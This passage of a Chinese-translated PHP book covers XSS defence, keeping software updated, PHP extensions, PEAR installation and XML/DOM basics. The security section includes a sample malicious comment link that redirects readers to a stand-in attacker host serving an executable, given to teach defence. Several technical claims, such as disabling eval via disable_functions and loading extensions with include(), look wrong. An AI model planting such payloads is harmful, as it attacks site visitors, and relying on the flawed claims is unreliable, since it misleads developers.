  \n当然，如果你阻止了脚本运行 `eval()` 函数，这个坏蛋还是会得手的。你可以在 `php.ini` 文件中如下禁用该函数：\n\n```text\ndisable_functions\
  \ eval\n```\n\n该主题的另一个变体涉及在表单中输入代码，这些代码在浏览器中运行时会对用户的本地系统进行操作。代码可能会窃取会话信息、设置 Cookie，并将毫无防备的访问者重定向到另一个网站。\n\
  \n例如，假设恶意用户在 `http://blog.example.com` 的评论区输入了以下代码：\n\n```html\n<a href=\"#\" onMouseOver(window.location\
  \ - 'http://vicious.cross-site-scripting.com/IEexploit.exe;')>点击这里！！<a/>\n```\n\n\
  当下一个用户加载博客文章及其评论时，他将被重定向到攻击者的服务器，并且可执行文件会在用户的浏览器中运行。\n\n如何知道你的应用程序是否受到跨站脚本攻击？`http://ha.ckers.org/xss.html`\
  \ 上的 XSS 页面提供了许多代码段，你可以将它们注入到表单中，以查看它们是否容易受到各种类型的跨站脚本攻击。花时间尝试破解自己的应用程序——早点发现代码有漏洞总比等黑客来告诉你要好。\n\
  \n### 防止 XSS\n\n跨站脚本可能非常恶劣，而且它的变体如此，以至于你很难定位并防止它。但你可以通过一件事来消除所有极少数坚定的 XSS 攻击：清理并验证所有用户输入。\n\
  \n黑客可以在任何表单元素中放入三行脚本；这并不非是一个用于 HTML 评论的大文本区域。事实上，除非你明确期望用户提供 HTML 输入，否则你应该过滤所有用户输入中的\
  \ HTML 标签并使用 `html_entities()` 对其进行转义。\n\n如果你确实期望用户提供 HTML，你仍然应该进行过滤。明确允许一组严格的 HTML\
  \ 标签子集——例如 `<em>`、`<strong>`、`<i>`、`<b>` 和 `<p>`。在存储或使用它们之前，你的应用程序应该拒绝任何其他内容。\n\n\
  \n\n\n\n# 保持更新\n\n为了确保应用程序尽可能安全，你可以采取的最关键步骤之一是确保运行着底层软件的最新稳定版本——包括 PHP、你的 Web 服务器以及你的操作系统。定期检查补丁和维护发布，或者订阅供应商的更新馈送，这样当补丁和新版本发布时，你就能及时获知。\n\
  \n## 如果这种情况发生在别人身上，也可能发生在你身上\n\n关于黑客（crackers），你有很多槽点可以吐——其中大部分内容在礼貌的场合是不宜提及的——但你不得不承认他们具有极强的韧性。Web\
  \ 服务器的新版本一发布，他们就会着手研究破解它的方法。你可以躲在网络的一个小角落里，希望他们注意不到你，但匿名性只能保护你一时间——而且时间并不像你想象的那么长。与其躲在角落希望不被发现，不如关注黑客的动态并反制他们的行动，这样当他们找到你时，你就不会是一个易攻之的目标。\n\
  \n如果你想关注互联网地下世界的活动，有几个安全网站会发布新漏洞的新闻，以及加固受影响系统的建议。至少每隔几周检查一次这些网站，查看与你系统类似的动态：\n\n\
  * ✦ SecurityFocus: www.securityfocus.com\n* ✦ SANS: http://sans.org\n* ✦ WindowSecurity.com:\
  \ www.windowsecurity.com\n* ✦ PHP Security Consortium: http://phpsec.org\n* ✦ PHP\
  \ Security Blog: http://blog.php-security.org\n* ✦ CERT: www.cert.org\n* ✦ OWASP:\
  \ www.owasp.org\n\n# 第五卷\n\n## PHP 扩展\n\n### 目录摘要\n\n* **第 1 章：扩展简介 ... 423**\n\
  * **第 2 章：使用 PEAR ... 429**\n* **第 3 章：使用 XML 扩展 ... 441**\n* **第 4 章：使用 GD 扩展处理图像\
  \ ... 449**\n* **第 5 章：邮件扩展 ... 459**\n\n# 第 1 章：扩展简介\n\n### 本章内容\n* 将扩展整合到 PHP\
  \ 整体架构中\n* 确定加载了哪些扩展\n* 加载扩展\n\nPHP 本身是一门非常精简的语言。它实际上并没有做什么——而这恰恰是它该有的样子，这样 PHP\
  \ 就不会加载你不需要的功能。PHP 社区的开发者创建了许多代码库，为基础 PHP 语言添加或扩展了功能。本章将为你提供所需的背景知识，让你能够使用 PHP 扩展，而无需花费下一个一个月去研究如何解析\
  \ XML 或生成图像。\n\n### 扩展如何融入 PHP 架构\n以下是 PHP 扩展的三种基本类型：\n\n* **Zend 扩展 (Zend extensions)：**\
  \ 这些扩展修改了 PHP 的基本性质。Zend 负责将人类可读的 PHP 解析并解释为机器级指令。除非你极其熟悉编程语言设计，并且擅长对 PHP 语言进行“手术”，否则你可以完全不管扩展。只需意识到这些扩展是可用的，并且如果你真的想做，可以在编译\
  \ PHP 时带有 Zend 扩展以修改 PHP 的核心即可。\n* **内置扩展 (Built-in extensions)：**这种类型的扩展比 Zend\
  \ 扩展要令人生畏得多。内置扩展是提供某些功能的代码库。这些扩展如此实用，以至于每个人最终都会使用它们，因此 PHP 开发团队直接将它们与 PHP 绑在一起起。在大多数情况下，你可以在不支持任何特定扩展的情况下编译\
  \ PHP。例如，如果你不打算生成图像，就不需要 `GD` 扩展，不带上它编译 PHP 可以节省资源。\n* **外部扩展 (External extensions)：**\
  \ 有时，某个扩展是为了解决一个非常特定的问题。另一些扩展尚未获得足够的普及以被提升为内置扩展。无论如何，你都可以找到许多非常有用的扩展，等待你将它们包含在下一个应用中。\n\
  \n### 找出加载了哪些扩展\n使用扩展的第一步是确定你需要的扩展是内置的，还是你需要加载它。PHP 提供了几种方法来获取所需的信息，具体取决于你想想知道什么。\n\
  \n#### get_loaded_extensions()\n`get_loaded_extensions()` 函数返回一个包含所有编译到你的 PHP 开发环境中的\
  \ PHP 函数的数组。该函数可以在命令行中使用：\n\n```\nphp -r 'print_r(get_loaded_extensions());'\n```\n\
  \n结果应该像这样：\n```\n$ Array\n(\n  [0] => xml\n  [1] => tokenizer\n  [2] => standard\n\
  \  [3] => sockets\n  [4] => session\n  [5] => posix\n  [6] => overload\n  [7] =>\
  \ odbc\n  [8] => mysql\n  [9] => mbstring\n  [10] => ldap\n  [11] => ftp\n  [12]\
  \ => exif\n  [13] => curl\n  [14] => ctype\n  [15] => zlib\n  [16] => pcre\n)\n\
  ```\n\n`get_loaded_extensions()` 函数也可以在脚本中用于交付已加载扩展的数组。\n\n#### extension_loaded()\n\
  有时你不需要知道所有信息，只需要一个对“这个扩展可用吗？”的直接回答。`extension_loaded()` 函数提供的正是这个——一个针对简单问题的布尔值回答。你可以在应用程序代码中动态加载扩展。只需在脚本顶部放置以下代码行即可：\n\
  \n```php\nif (!extension_loaded($extension)) {\n    dl($extension);\n}\n```\n\n\
  #### php -m\n如果你正盯着命令行，不知道哪些扩展可用，`php -m` 函数比 `get_loaded_extensions()` 提供了更简洁的界面。要使用\
  \ `php -m`，请在命令行输入：\n\n```\nphp -m\n```\n\n#### php --re extension\n当你知道需要的扩展已加载后，你可能想要一些用法信息。命令行开关\
  \ `--re extension`（如下代码行所示）可以为指定的扩展提供熟悉的用法语句：\n\n```\nphp --re curl\n```\n\n####\
  \ php --ri extension\n`php --ri` 与 `--re` 标志相似，不同在于 `--ri` 提供的是给定扩展的配置信息。\n\n###\
  \ 加载扩展\n如果你需要的扩展没有内置在 PHP 中，你需要通过使用 `require()` 或 `include()` 函数以编程方式加载它。这两个函数的作用几乎相同——它们作为你想要加载的扩展的占位符。\n\
  \n\n\n\n\n# 第五卷：PHP 扩展\n\n## 介绍\n\n例如，我们创建一个如下的小型脚本并将其命名为 `message`。\n\n```php\n\
  <?php\n$message = \"Hello World!\";\n?>\n```\n\n`message.php` 实际上并没有产生任何输出。它只是初始化了变量\
  \ `$message`。因此，你需要创建第二个名为 `action` 的脚本。\n\n```php\n<?php\necho $message;\ninclude(\"\
  ./message.php\");\necho $message;\n?>\n```\n\n第一个 `echo` 语句会产生一个空字符，因为你还没有定义 `$message`\
  \ 变量。第二个 `echo` 语句会打印你的消息。`include()` 语句本质上是将扩展中的代码剪切并粘贴到调用脚本中。代码的执行方式就像脚本写成这样：\n\
  \n```php\n<?php\necho $message;\n$message = \"Hello World!\";\necho $message;\n\
  ?>\n```\n\n前面的示例使用了 `include()` 语句。你也可以使用 `require()`，它完成相同的任务，区别在于处理错误的方式。如果想要引入脚本的扩展项不存在或无法找到，`require()`\
  \ 会抛出一个致命错误并导致整个应用程序崩溃——这通常不是一件好事，特别是在生产环境中。\n\n`include()` 语句只会发出一个警告并尽力继续运行。\n\
  \n当你的应用程序比几个包含某些扩展的脚本更复杂时，请通过使用 `include_once()` 或 `require_once()` 来应对这种复杂性。这些函数在尝试重新加载之前会检查给定的扩展是否已经加载。如果你的代码尝试包含一个已经加载的扩展，PHP\
  \ 在函数被重复定义时会抛出一个致命错误。\n\n## 第 2 章：使用 PEAR\n\n### 本章内容\n本书的第一章讨论了 PHP 扩展如何为该语言添加许多功能并让你的生活变得更轻松。但等一下——还有更好的！PEAR（即\
  \ PHP 扩展应用程序库）是一个扩展和代码库，你可以在应用程序中使用它。在本章中，你将了解到 PEAR 到底是什么、如何设置它，以及如何在你的应用程序中使用\
  \ PEAR 包。\n\n### 介绍 PEAR\nPEAR 不仅仅是一种健康的零食，它也是一种健康的编程方式。为什么呢？因为 PEAR 允许你忽略运行应用程序时需要的大部分代码。你可以花费几个小时来研究连接应用程序到数据库的最佳且安全的方法，你也可以花费一个月的时间从零开始创建它——那将浪费你的时间和精力。你最好使用现有代码，并将时间花在应用程序的实际功能上。\n\
  \nPEAR 是一个用于开发和发布应用程序的五部分工具包。PEAR 工具包包括：\n\n- 一个可以自由复用的开源代码结构化库\n- 一个代码分发和包维护系统\n\
  - 适用于 PHP 的标准化编码风格\n- PHP 扩展社区 (`PECL` —— 读作“pickle”）\n- 一个网站、邮件列表和下载镜像站\n\n在你花费时间安装和配置\
  \ PEAR 之前，请观察一下并自行判断这些包、编码标准和社区支持是否是你加速开发所需的工具。很有可能，你会发现至少有一个扩展能让你惊奇自己在没有它的情况下是如何编写代码的，但每个应用程序和每个开发者都是不同的。不要因为大家都在谈论它就跑去获取\
  \ PEAR。\n\n### PEAR 库\n包库是 PEAR 的核心内容。你可以通过 `http://pear.php.net/packages.php` 浏览该库。截至写此本文时，你可以在\
  \ 49 个类别中找到 450 个包。PEAR 中的大多数包都是与基础设施相关的——它们处理数据库连接、身份验证和缓存等脏活。如果你应用程序的某个特定元素让你头疼，请检查一下\
  \ PEAR 库。可能已经有人写了你需要的代码。在 PEAR 库中你可以找到的不只是硬核后端模块。你还可以找到更轻量的内容，包括图像库、Web 服务、文本模块，甚至如果你感兴趣的话，还有化学模块。\n\
  \n如果你点击 PEAR 库中包的名称，将出现包信息页，提供你决定是否要使用该代码所需的所有信息。页面上需要注意的一些重要规范包括：\n\n- **摘要 (Summary)**：对包及其用途的简要描述。\n\
  - **许可证 (License)**：大多数包根据某种形式的 GNU 公共许可协议 (GPL) 发行。\n- **当前版本 (Current release)**：最新的版本号、发布时间以及指向该包开发路径的链接。\n\
  - **错误摘要 (Bug summary)**：告诉你当前开启了多少个 bug、该包的维护排名、关闭 bug 平均需要多长时间，以及最旧的未修复 bug。\n\
  - **描述 (Description)**：对包进行更深入的描述。\n- **维护者 (Maintainers)**：负责维护包和修复 bug 的开发者列表。\n\
  - **更多信息 (More Information)**：浏览源码树、RSS 发布馈送和下载统计数据的链接。\n- **依赖此包的包 (Packages that\
  \ depend on this package)**：任何依赖于当前包的包的链接。\n\n### 设置 PEAR\n包信息页还包含下载包、查看文档和报告 bug\
  \ 的链接。\n\n### 代码分发和包维护\nPEAR 是一个社区活动，基于“给出一个包，取一个包”的理论。欢迎你从库中使用任何需要的代码，如果你开发了一个其他人可能认为有用的\
  \ PHP 模块，我们鼓励你向世界分享它。PEAR 库提供了一种让你的代码供社区使用的简单方法。你任何想要提交的代码必须满足以下要求：\n\n- 你的代码必须符合\
  \ PEAR 编码标准。\n- 它必须根据开源许可证之一进行适当授权，例如新 BSD 许可证。\n- 你必须通过公共仓库发布源码，例如 SourceForge\
  \ (`http://sourceforge.net`) 或 Google Code (`http://code.google.com`)。\n- 你编写包的方式必须确保将来可以对其进行扩展和改进。\n\
  - 你必须以纯文本或 DocBook XML 文件提供文档。\n- 你必须为你的代码提供回归测试。\n- 你必须愿意维护和支持你的包。\n\n\n\n\n\n\
  上述列表对于某些人来说可能要求过高，但这些要求实际上都是为了整个社区的利益。如果没有编码标准、开源许可、文档、回归测试以及对维护模块的承诺，PEAR 库将迅速充斥\
  \ Bug、缺乏文档且无人维护的代码——这会违背 PEAR 的初衷。毕竟，如果你知道在使用前必须先进行调试，你也就不会费劲去使用一个 PEAR 包了，对吧？在这种情况下，你可能更倾向于自己编写代码——至少你熟悉这种编码风格，并且知道这些代码的意图是什么。\n\
  \n# 介绍 PEAR\n\n## 编码标准\n\n编码标准在一些相当深奥的开发者邮件列表上是一个被激烈讨论的话题，但没有人真的不同意拥有一种标准的编写代码方法是一件好事。你可能更倾向于使用三空格缩进，Tricia\
  \ 对她的五个空格有深厚感情，而 Bill 会为他的 Tab（制表符）战到死——但归底，大家都同意开发者应该坚持一种方法，而不是在同一个模块中混合不同的风格。PEAR\
  \ 编码标准强制执行了 PEAR 库中每个模块风格的连续性。标准的大部分是相当随意的，有些实际上具有逻辑意义，但你可以依赖每个 PEAR 模块都具有相同的风格，这使得将模块插入你的应用程序中，以及在需要时深入研究其内部原理变得不那么痛苦。\n\
  \n你可以在 `http://pear.php.net/manual/en/standards.php` 阅读标准。\n\n## PECL\n\nPHP 扩展社区库\
  \ (PECL) 与 PEAR 类似，它们都提供了一个组织的 PHP 代码库。PEAR 库包含了你可以插入到自己应用程序中的模块。而 PECL 包含的是针对 PHP\
  \ 本身的扩展。它使用 PEAR 框架，因此在你配置好 PEAR 后，你也可以访问 PECL 仓库。\n\n`PEAR packages` 是你可以放入各个独立应用程序中的代码模块。PECL\
  \ 则更深一层，提供了你可以直接编译到系统中 PHP 解释器中的代码，从而使你开发的任何应用程序都能使用这些功能。\n\n## PHP 社区支持\n\n像 PEAR\
  \ 这样的开源社区资源，如果没有五六个邮件列表、大量的教程和一个专门的论坛网站，会变成什么样？这看起来是不对的。幸运的是，PEAR 团队理解开源文化，并为开发者提供了互相帮助和分享想法的基础。\n\
  \nPEAR 有三个主要的公共列表：\n\n- **通用列表 (General list)：** 如果你在使用 PEAR，可能想订阅 PEAR 通用列表以跟上进展，并与你的\
  \ PHP 开发者分享建议和技巧。\n- **开发者列表 (Developers list)：** 如果你计划为 PEAR 贡献代码，请加入 PEAR 开发者列表。这是\
  \ PEAR 开发者聚集讨论 PEAR 内部原理的地方。\n- **文档列表 (Documentation list)：** 如果你是个文字控，可以加入 PEAR\
  \ 文档列表，帮助完成那永无止的的编写任务。\n\n你可以在 `http://pear.php.net/support/lists.php` 加入任何或所有 PEAR\
  \ 邮件列表。你可以找到其他几个可用列表，但它们是为在 PEAR 后台工作的人准备的。按照真正的开源风格，没有任何东西能阻止普通用户加入任何 `Using PEAR`\
  \ 列表。\n\n# 下载并安装 PEAR 包管理器\n\n在深入学习 PEAR 之前，你需要在你的开发环境中安装并配置它。\n\n如果你的 PHP 版本是 `4.3.0`\
  \ 或更高版本，你可能已经安装了 PEAR。然而，截至本文编写时，PEAR 项目还相对新，因此你可能想确保你拥有最新版本的 PEAR 包管理器。它处理安装 PEAR\
  \ 包、管理已安装包注册以及检查依赖关系的所有脏活。\n\n你可以通过两种方式安装 PEAR 管理器：通过 Web 前端或命令行。如果你的应用程序运行在共享托管环境中，且你没有服务器的\
  \ SSH 权限，请使用 Web 前端。如果你更习惯黑屏幕和闪烁的光标，请使用命令行。这完全取决于你——它们都会在你的电脑上安装 PEAR。我们将在后续章节中解释如何使用这两种方法。\n\
  \n### 通过 Web 前端安装\n\n通过 Web 前端安装 PEAR 包管理器，请遵循以下步骤：\n\n1. **将浏览器指向 `http://pear.php.net/go-pear`。**\n\
  \   你的浏览器将以纯文本显示 PHP 源码。\n2. **选择文件 ➪另存为或文件 ➪保存页面为**（取决于你的浏览器）。将文件保存为 `go-pear.php`。\n\
  3. **将刚刚保存的 `go-pear.php` 文件上传到你的服务器并在浏览器中打开。**\n   例如，如果你的域名是 `my-application.com`，你应该打开\
  \ `http://my-application.com/go-pear.php`。\n\n不要忘记通过将 PEAR 目录的权限设置为 `0600` 或 `0644`\
  \ 来保护服务器上的 PEAR 目录。如果你不确定使用哪一个，请询问你的系统管理员。\n\n![Image 62](img/index-463_1.jpg)\n\
  \n会出现一个如图 2-1 所示的欢迎屏幕。此屏幕显示 `go-pear.php` 文件位于你的服务器上，并且具有运行所需的权限。到目前为止一切正常！\n\n\
  **图 2-1：** PEAR 安装程序的欢迎界面显示 go-pear.php 脚本正在正常运行。\n\n点击 Next（下一步）按钮并为你的环境选择合适的配置设置。图\
  \ 2-2 中的警告消息显示默认权限不足以 go-pear 脚本完成安装。不要担心，非常常见的错误。要修复它，你需要将安装目录的权限设置为 `0777` 或 `rwxrwxrwx`。将网站的根目录设置为\
  \ `0777` 是极不安全的。此设置允许任何人读取、写入和执行该目录下的文件。完成安装后，请将该目录（以及你修改过的任何其他目录）的权限重置为 `0600`\
  \ 或 `0644`。\n\n从现在开始，安装脚本将访问 PEAR 仓库并下载核心 PEAR 包的最新版本。下载可能需要一些时间，取决于你的环境，你可能需要更改几个目录的权限。只要你遵循屏幕上的提示，就没问题。\n\
  \n![Image 63](img/index-464_1.jpg)\n\n**图 2-2：** 配置界面警告脚本没有足够的权限进行安装。\n\n### FTP\
  \ 安装\n\n如果你倾向于使用 FTP（或其安全兄弟 SFTP 或 FTPS）来安装 PEAR 管理器，请遵循这些简单的步骤：\n\n1. **在安装 PEAR\
  \ 管理器之前，确保你的本地机器上运行着 PHP `5.0` 或更高版本，并安装了 `openssl` 或 `ssh2` 扩展。**\n   你需要在本地机器上使用\
  \ PHP，是因为你会在机器上创建并维护 PEAR 仓库的本地备份。你可以在本地对包进行更改（安装、更新和删除），并将远程主机同步到本地副本。\n2. **通过命令行输入以下命令，验证你的本地机器上已安装\
  \ PEAR 管理器的命令行界面版本：**\n\n```bash\n$ whereis pear\n```\n\n你应该看到类似的结果的结果：\n`/usr/bin/pear`\n\
  \n\n\n\n\n如果你没有看到这一行或类似的内容，说明你没有 PEAR 管理器。在继续之前，请在本地下载并安装管理器。请记住，你需要的是 `pear` 命令而不是\
  \ Web 界面。\n\n# 下载和安装 PEAR 包管理器\n\n3. **使用 PEAR 命令行安装程序在你的本地机器上安装 `PEAR_RemoteInstaller`\
  \ 包，如下所示：** `$ pear install PEAR_RemoteInstaller`\n\n4. **验证你是否通过 `ftp` 拥有远程主机的写入权限。**\n\
  你可以通过一种简单的方法来测试此权限——如果你可以通过 `ftp` 登录到远程主机，并创建或上传一个文件，说明你一切就绪了。\n\n5. **找到你主目录的完整路径。**\n\
  如果你不知道主目录的完整路径，请将以下脚本上传到你的 Web 主机。运行此脚本，它将显示你主目录的完整路径：\n\n```php\n<?php\necho dirname(__FILE__);\n\
  ?>\n```\n\n6. **为本地机器和远程主机创建自定义配置文件。**\n要创建此文件，你需要选择一个存储本地仓库的位置，例如 Windows 上的 `C:\\\
  PEAR` 或 Linux、Unix 或 Mac 上的 `/home/username/PEAR`。创建本地目录，然后进入该目录并运行 `pear config-create`\
  \ 脚本。语法取决于你的本地仓库是在 Windows 还是 Linux/Unix/Mac 机器上。Windows 语法为 `pear config-create\
  \ -w C:\\remote\\pear remote.ini`。在 Linux、Unix 或 Mac 上上，使用 `config-create /home/mylocaluser/remote.conf`\
  \ 格式。最后，再次运行 `config-create` 脚本为远程主机创建配置文件：`pear config-create /home/username/pear\
  \ .pearrc`。\n\n7. **将远程配置文件 `.pearrc` 上传到你的远程主机。**\n\n8. **在本地配置文件中设置 `remote_config`\
  \ 指向远程主机上 `.pearrc` 文件的位置。**\n最简单的方法是使用 `pear –c` 命令：`pear –c remote.ini config-set\
  \ remote_config ftp://user:pass@myremotehost.com/.pearrc`。\n如果你的本地机器是 Linux/Unix/Mac\
  \ 设备，请将 `remote.ini` 更改为 `remote.conf`。如果你使用的是安全 FTP，请将流协议从 `ftp://` 更改 `ftps://`\
  \ 或 `ssh2.sftp://`。\n\n9. **使用 `remote-install`、`remote-uninstall`、`remote-upgrade`\
  \ 和 `remote-upgrade-all` 命令管理你的包：** `$ pear remote_upgrade_all`\n这些命令的工作方式与对应的本地命令完全相同，但它们还会同步远程仓库。\n\
  \n# 安装 PEAR 包\n\n在你服务器或本地机器上安装并运行 PEAR 管理器后（我们在前面的章节中会介绍这一点），你就可以开始使用 PEAR 安装 PEAR\
  \ 包了。你首先必须决定需要哪些包。\n\n将你的 Web 浏览器指向 PEAR 包浏览器 `http://pear.php.net/packages.php`，并浏览直到找到符合你需求的包。记下包名，如图\
  \ 2-3 所示。\n\n**图 2-3：** 记录用于安装过程的包名。\n\n### 从命令行安装 PEAR 包\n打开命令行窗口（Windows）或 shell（Linux/Unix/Mac）并输入以下命令：\n\
  `pear install package_name`\n\n如果你想使用的包状态不是稳定（stable），你必须通过以下方式之一强制安装：\n\n* **使用\
  \ `–beta` 标记：**\n  `pear install package_name-beta`\n* **使用 `config-set` 命令设置首选状态：**\n\
  \  `pear config-set preferred_state beta`\n  `pear install package_name`\n  `pear\
  \ config-set preferred_state stable`\n* **使用 `-d` 切换设置首选状态：**\n  `pear -d preferred_state=beta\
  \ install package_name`\n* **强制安装：**\n  `pear install -f package_name`\n\n你只需要启动安装并放松即可——PEAR\
  \ 命令行安装程序会处理剩下的细节。\n\n如果你不想立即安装包，或者需要在离线环境中安装，请通过向 PEAR 提供文件名而不是包名，以本地模式使用 PEAR\
  \ 命令行安装程序。例如 `pear install package_name.tar.gz`。\n\n如果你处于共享主机环境且没有服务器的 shell 权限怎么办？你也可以使用\
  \ Web 前端执行包管理。首先，你需要按照以下步骤安装 Web 安装包：\n\n1. **从 PEAR 库下载 `.tar.gz` 格式的 `PEAR_Frontend_Web`\
  \ 包。**\n2. **在你的 Web 根目录下创建一个名为 `PEAR_installer` 的目录（或其他你认为合理的其他名称）。**\n3. **将 `.tar.gz`\
  \ 文件上传到你的 Web 主机。**\n4. **使用你的 FTP 客户端或文件管理器解压文件。**\n如果你的 FTP 客户端或文件管理器没有提供解压功能，你必须在本地解压，然后通过\
  \ FTP 将文件传输到服务器。\n5. **将你的 Web 浏览器指向你在步骤 2 中创建的目录。** 例如，如果你将目录命名为 `PEAR_installer`\
  \ 且域名为 `example.com`，完整 URL 应该是 `http://www.example.com/PEAR_installer`。\n6. **点击左列的配置图标打开配置页面，验证安装程序发现了正确的路径。**\n\
  如果路径不正确，配置页面为你提供了修复机会。\n\n使用包管理链接在你的服务器上安装、删除、升级和搜索已安装的包。Web 安装器为执行最常见的包管理任务提供了一个直观的界面。\n\
  \n### 通过 CVS 安装\n在正常开发中，你不需要通过 CVS 安装包。CVS 版本不是发布包，因此在支持或保证方面，它们只有几个警告外别无其他。最重要的是，CVS\
  \ 版本没有来自维护者的支持，它们可能会破坏 PEAR 安装器中的 `UPGRADE` 功能。使用风险自负。\n\n虽然你已经准备好了且有些紧张，但在某些情况下你确实需要\
  \ CVS 版本：\n* 维护者针对你的特定应用程序向你推荐了它。\n* 你正在帮助开发该包。\n* 你绝对无法离开尚未进入最新发布版本的前沿功能。\n\n如果你决定使用\
  \ CVS 版本，请按照以下步骤获取：\n1. **获取以下必要的工具（如果你尚未拥有）：**\n   * `autoconf` 版本 2.13。\n   *\
  \ `automake` 1.4 或更高版本。\n   * `libtool` 1.4.x 或更高版本，但不是 1.4.2。\n   * `bison` 1.28、1.35、1.75、2.0\
  \ 或更高版本。\n   * `flex` 2.5.4 版本，但不能更高。\n   * 如果你正在帮助某个包的开发，你还需要 `re2c` 0.9.11 或更高版本，或\
  \ `HEAD` 0.12.0 或更高版本。\n2. **通过将以下代码放入你的 `/.cvsrc` 文件，在你的 Web 服务器或本地开发机上配置 CVS：**\n\
  ```\ncvs -z3\nupdate -d -P\ncheckout -P\ndiff –u\n```\n3. **从 PEAR CVS 服务器获取包：**\n\
  ```\ncvs -d :pserver:cvsread@cvs.php.net:/repository\ncheckout pear/package_name\n\
  ```\n\n\n\n\n4. 确保 `package.xml` 文件中的文件集项与你现有的文件和目录结构匹配。\n\n5. 在命令行中输入此代码，使用 PEAR\
  \ 安装器从 CVS 文件创建一个有效的包：\n\n```bash\npear package *path to package.xml*\n```\n\n6.\
  \ 如果你已经安装了之前的版本的包，请先卸载它以避免版本问题。\n\n在命令行中输入以下命令，使用 PEAR 安装器中的 `uninstall` 命令：\n\n\
  ```bash\npear uninstall *package\\_name*\n```\n\n7. 像安装任何其他 PEAR 包一样，通过输入以下命令来安装新创建的包：\n\
  \n```bash\npear install *package\\_name*\n```\n\n如果你以后决定安装该包的发布版本，务必先卸载 CVS 版本，以避免版本混淆。\n\
  \n## 在你自己的代码中使用 PEAR 包\n\n在安装了所需的包之后（你可以在前面的章节中阅读该过程的内容），你只需通过在源代码中包含对包的引用来使用这些包，然后使用该包包含的函数。例如，假设你安装了\
  \ `Date` 包。你可以像使用 PHP 的一部分一样使用 `Date` 类及其成员函数：\n\n```php\n<?php\ninclude_once(\"\
  Date.php\");\n$today = new Date('2007-09-25T16:24:52');\nEcho $today->getDate();\n\
  ?>\n```\n\n务必阅读你安装的任何包的文档，以便了解哪些功能是可用的。很有可能，除非你想做非常独特的事情，否则你总能找到一个内置函数来完成任务。\n\n\
  ## 第 3 章：使用 XML 扩展\n\n### 本章内容\n- 介绍文档对象模型 (DOM)\n- 使用 XML Schema 验证数据\n- 使用 XSLT\
  \ 更改文档类型\n- 使用 XPath 搜索 XML 文档\n\nXML 是数据存储和处理工具的“瑞士军刀”。它小巧、便携，并且几乎可以完成你需要的任何事情（除了打开豆头罐）。\n\
  \n本章将引导你了解使用 PHP 操作 XML 文档的细节，从文档对象模型（简称 DOM）开始。从那里，我们介绍了三个最著名的 XML 技术：XML Schema、XSLT\
  \ 和 XPath。\n\n### 理解文档对象模型\n文档对象模型 (DOM) 定义了 XML 的基本结构。PHP 的最新版本完全按照 W3C 在 `www.w3.org/dom`\
  \ 发布的 DOM/XML 标准实现。\n\n### 读取 DOM\n你可以通过两种方式从 DOM 中提取有用信息：\n- 遍历文档树\n- 按 ID 或名称进行搜索\n\
  \n要遍历整个文档树，请使用带有通配符字符 (`*`) 的 `getElementsByTagName()` 函数，如下：\n\n```php\n$xmlDoc\
  \ = new DOMDocument(\"xmlsource.xml\");\n$nodes = $xmlDoc->getElementsByTagName('*');\n\
  foreach( $nodes as $item ) {\n    echo $item->getAttribute('name');\n}\n```\n\n\
  要按标签名搜索，使用相同的代码，但将通配符字符 (`*`) 替换为你搜索的标签名称。变量 `$nodes` 将包含匹配你所搜索标签的节点数组。\n\n如果你在\
  \ XML 文档结构中按 ID 划分关键元素，你可以使用 `getElementByID()` 函数进行更精确的搜索。只需将前一个示例中的 `getElementsByTagName()`\
  \ 函数调用替换为 `getElementByID()` 即可。\n\n### 写入 DOM\n你可能发现搜索 DOM 中的特定信息很有用，但当你使用 PHP\
  \ 写入 DOM 时，它才会真正大放异彩。手动编写 XML 最多也是枯燥的。通过 PHP，你可以指定文档的结构，并让脚本执行将原始数据转换为 XML 的实际工作。PHP\
  \ 内置的 XML 支持提供了许多工具，用于创建和填充 XML 文档：\n- `createElement()`：接受两个参数——名称和值\n- `createProcessingInstruction()`：插入处理指令\n\
  - `createTextNode()`：创建文本节点\n- `createCDATASection()`：创建 CDATA 段\n- `createAttribute()`：创建属性\n\
  \n例如，以下代码创建一个带有“War and Peace”元素的 文档：\n\n```php\n$xmlDoc = new DOMDocument();\n\
  $xmlDoc->appendChild(\n    $xmlDoc->createElement('War and Peace')\n);```\n\n注意\
  \ `appendChild()` 函数的结果被添加到了文档中。\n\n### 使用 Schema 进行验证\n`Schema` 是验证文档结构的 W3C 标准。使用\
  \ Schema 允许验证整个文档的有效性，也可以指定单个元素的类型。\n\n**示例 3-1：一个 Schema 文档**\n```xml\n<xsd:schema\
  \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\">\n    <xsd:annotation>\n      \
  \  <xsd:documentation>\n            Sample schema\n        </xsd:documentation>\n\
  \    </xsd:annotation>\n    <xsd:element name=\"newsletter\">\n        <xsd:complexType>\n\
  \            <xsd:sequence>\n                <xsd:element name=\"comment\" type=\"\
  xsd:string\" minOccurs=\"0\"/>\n                <xsd:element name=\"header\" type=\"\
  HeaderType\"/>\n                <xsd:element name=\"section1\" type=\"SectionType\"\
  />\n                <xsd:element name=\"section2\" type=\"SectionType\"/>\n    \
  \        </xsd:sequence>\n            <xsd:attribute name=\"volume\" type=\"xsd:positiveInteger\"\
  />\n            <xsd:attribute name=\"number\" type=\"xsd:positiveInteger\"/>\n\
  \        </xsd:complexType>\n    </xsd:element>\n    <xsd:complexType name=\"HeaderType\"\
  >\n        <xsd:sequence>\n            <xsd:element name=\"long_title\" type=\"\
  xsd:string\"/>\n            <xsd:element name=\"filename\" type=\"xsd:string\"/>\n\
  \            <xsd:element name=\"date\" type=\"xsd:date\"/>\n            <xsd:element\
  \ name=\"meta_title\" type=\"xsd:string\"/>\n            <xsd:element name=\"meta_description\"\
  \ type=\"xsd:string\"/>\n            <xsd:element name=\"meta_keywords\" type=\"\
  xsd:string\"/>\n        </xsd:sequence>\n    </xsd:complexType>\n</xsd:schema>\n\
  ```\n\n**示例 3-1（继续）**\n```xml\n<xsd:complexType name=\"SectionType\">\n    <xsd:sequence>\n\
  \        <!-- 每个部分都必须有一个标题 -->\n        <xsd:element name=\"title\" type=\"xsd:string\"\
  \ minOccurs=\"1\"/>\n        <!-- 每个部分最多有 2 个链接和 URL -->\n        <xsd:element name=\"\
  linktitle1\" type=\"xsd:string\" minOccurs=\"0\"/>\n        <xsd:element name=\"\
  url1\" type=\"xsd:uriReference\" minOccurs=\"0\"/>\n        <!-- 每个部分都必须有一个注释 -->\n\
  \        <xsd:element name=\"annotation1\" type=\"xsd:string\" minOccurs=\"1\"/>\n\
  \        <xsd:element name=\"toc1\" type=\"xsd:boolean\" minOccurs=\"0\"/>\n   \
